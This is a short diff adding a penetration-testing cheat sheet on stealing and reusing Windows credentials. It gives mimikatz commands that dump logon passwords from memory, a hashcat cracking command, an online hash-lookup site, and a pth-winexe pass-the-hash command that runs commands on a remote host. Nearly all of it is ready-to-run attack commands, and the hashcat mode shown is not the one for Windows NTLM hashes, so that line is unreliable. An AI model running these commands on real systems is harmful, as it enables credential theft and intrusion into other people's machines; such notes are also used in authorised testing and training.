@@ -1,0 +1,16 @@
+If you've downloaded mimkatz on the local machine, then you can dump creds using this on the mimkatz shell -
+
+privilege::debug
+sekurlsa::logonPasswords full
+
+Now, you can either pass the hash or crack the hash based on what the vulnerable system will take -
+
+Crack using hashcat
+hashcat -m 400 -a 0 <hashfile> <dictionary>
+
+Online search previously found hashes
+http://www.hashkiller.co.uk/
+
+Pass the hash
+pth-winexe -U <hash> //<host> <command>
+
